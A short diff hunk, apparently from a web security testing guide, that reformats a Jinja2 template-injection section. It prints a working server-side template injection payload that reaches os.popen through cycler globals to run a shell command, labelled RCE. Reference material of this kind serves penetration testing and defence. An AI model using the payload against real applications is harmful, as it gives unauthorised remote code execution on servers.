@@ -134,8 +134,8 @@ Different content types hit different validators or code paths (parser different
 
 **Template Injection (Jinja2)**
 ```python
-{{7 * 7}}  # Arithmetic confirmation
-{{cycler.__init__.__globals__["os"].popen("id").read()}}  # RCE
+{{7*7}}  # Arithmetic confirmation
+{{cycler.__init__.__globals__['os'].popen('id').read()}}  # RCE
 ```
 Check autoescape settings and custom filters/globals.
 
